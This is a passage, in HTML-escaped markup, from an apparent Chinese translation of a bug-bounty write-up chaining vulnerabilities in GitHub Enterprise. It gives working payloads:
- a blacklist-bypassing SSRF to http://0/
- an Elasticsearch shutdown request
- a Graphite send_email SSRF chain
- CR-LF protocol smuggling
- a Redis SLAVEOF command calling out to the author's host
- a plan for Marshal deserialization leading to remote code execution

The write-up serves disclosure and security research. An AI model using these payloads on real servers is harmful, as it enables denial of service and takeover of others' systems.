&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;application&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;urlencoded&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8972&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;GitHub Enterprise使用Ruby Gem faraday来获取外部资源，并通过Gem faraday-restrict-ip-addresses防止用户请求内部服务。&lt;/p&gt;
&lt;p&gt;这个Gem似乎只是一个黑名单，可以通过RFC 3986中定义的罕见IP地址格式轻松绕过。在Linux中，0代表localhost。&lt;/p&gt;
&lt;p&gt;PoC：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://0/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;好了，我们现在有一个SSRF了。然而，我们仍然不能做任何事情。为什么？&lt;/p&gt;
&lt;p&gt;这个SSRF有几个限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅支持POST方法&lt;/li&gt;
&lt;li&gt;仅允许HTTP和HTTPS方案&lt;/li&gt;
&lt;li&gt;不支持302重定向&lt;/li&gt;
&lt;li&gt;在faraday中无法进行CR-LF注入&lt;/li&gt;
&lt;li&gt;无法控制POST数据和HTTP头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;唯一可以控制的是路径部分。&lt;/p&gt;
&lt;p&gt;但是，值得一提的是，这个SSRF可以导致拒绝服务(DoS)。&lt;/p&gt;
&lt;p&gt;有一个Elasticsearch服务绑定在端口9200上。在shutdown命令中，Elasticsearch不关心POST数据是什么。因此，你可以玩它的REST-ful API来取乐:P&lt;/p&gt;
&lt;p&gt;拒绝服务PoC：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://0:9200/_shutdown/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;第二个漏洞---内部graphite中的ssrf&#34;&gt;第二个漏洞 - 内部Graphite中的SSRF
&lt;/h3&gt;&lt;p&gt;我们现在有一个SSRF，但有很多限制。我能做什么？
我的下一个想法是 - 有没有我们可以利用的内网服务？&lt;/p&gt;
&lt;p&gt;这是一项大工程。内部有几个HTTP服务，每个服务基于不同的语言实现，如C/C++、Go、Python和Ruby&amp;hellip;&lt;/p&gt;
&lt;p&gt;经过几天的挖掘，我发现有一个叫做Graphite的服务运行在端口8000上。Graphite是一个高度可扩展的实时图形系统，GitHub使用这个系统向用户显示一些统计数据。&lt;/p&gt;
&lt;p&gt;Graphite是用Python编写的，也是一个开源项目，你可以在这里下载源代码！&lt;/p&gt;
&lt;p&gt;通过阅读源代码，我很快在这里发现了另一个SSRF。第二个SSRF很简单。&lt;/p&gt;
&lt;p&gt;在文件webapps/graphite/composer/views.py中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;send_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;recipients&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;to&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;proto&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;frag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;urlsplit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTPConnection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getresponse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;你可以看到Graphite接收用户输入的url并直接获取它！所以，我们可以使用第一个SSRF来触发第二个SSRF，并将它们组合成一个SSRF执行链。&lt;/p&gt;
&lt;p&gt;SSRF执行链有效载荷：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://0:8000/composer/send_email?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;to=orange@nogg&amp;amp;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;url=http://orange.tw:12345/foo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;第二个SSRF的请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ nc -vvlp 12345
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /foo HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: orange.tw:12345
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: identity
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;好了，我们成功地将基于POST的SSRF变成了基于GET的SSRF。但仍然不能做任何事情。&lt;/p&gt;
&lt;p&gt;让我们进入下一阶段！&lt;/p&gt;
&lt;h3 id=&#34;第三个漏洞---python中的cr-lf注入&#34;&gt;第三个漏洞 - Python中的CR-LF注入
&lt;/h3&gt;&lt;p&gt;如你所见，Graphite使用Python的httplib.HTTPConnection来获取资源。经过一些尝试和错误，我注意到httplib.HTTPConnection中存在CR-LF注入。因此，我们可以在HTTP协议中嵌入恶意负载。&lt;/p&gt;
&lt;p&gt;CR-LF注入PoC：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;composer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send_email&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;orange&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nogg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12345&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Ai_am_payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AFoo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vvlp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12345&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;i_am_payload&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Foo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12345&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Encoding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;identity&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这是一小步，但对整个漏洞利用链来说是一个巨大的飞跃。现在，我可以在这个SSRF执行链中走私其他协议。例如，如果我们想玩Redis，可以尝试以下有效载荷：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://0:8000/composer/send_email?
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;to=orange@nogg&amp;amp;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;注意：SLAVEOF是一个非常棒的命令，可以让你产生出站流量。当面对一些盲SSRF时，这是一个有用的技巧！&lt;/p&gt;
&lt;p&gt;看起来很棒！然而，协议走私也有一些限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要握手的协议如SSH、MySQL和SSL会失败&lt;/li&gt;
&lt;li&gt;由于Python2的限制，我们在第二个SSRF中使用的有效载荷只允许0x00到0x8F的字节&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;顺便说一下，在HTTP方案中走私协议的方法不止一种。在我的幻灯片中，我还展示了如何利用Linux Glibc的特性通过SSL SNI走私协议，以及一个绕过Python CVE-2016-5699的案例研究！&lt;/p&gt;
&lt;p&gt;如果你感兴趣，可以查看一下 :)&lt;/p&gt;
&lt;h3 id=&#34;第四个漏洞---不安全的反序列化&#34;&gt;第四个漏洞 - 不安全的反序列化
&lt;/h3&gt;&lt;p&gt;现在，我们有了在HTTP协议中走私其他协议的能力，但下一个问题是，我选择走私什么协议？&lt;/p&gt;
&lt;p&gt;我花了很多时间研究如果我能控制Redis或Memcached，可以触发什么漏洞。&lt;/p&gt;
&lt;p&gt;在审查源代码时，我很好奇为什么GitHub可以在Memcached中存储Ruby对象。经过一些挖掘，我发现GitHub Enterprise使用Ruby Gem memcached来处理缓存，并且缓存是用Marshal包装的。&lt;/p&gt;
&lt;p&gt;这对我来说是个好消息。每个人都知道Marshal是危险的。&lt;/p&gt;
&lt;p&gt;（如果你不知道，我推荐你阅读@frohoff和@gebl在AppSec California 2015上的幻灯片《Marshalling Pickles》）&lt;/p&gt;
&lt;p&gt;所以，我们的目标很明确。&lt;/p&gt;
&lt;p&gt;我们使用SSRF执行链在Memcached中存储恶意的Ruby对象。下次GitHub获取缓存时，Ruby Gem memcached会自动反序列化数据。结果是&amp;hellip; BOOM！远程代码执行！XD&lt;/p&gt;
&lt;p&gt;Rails控制台中的不安全Marshal：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
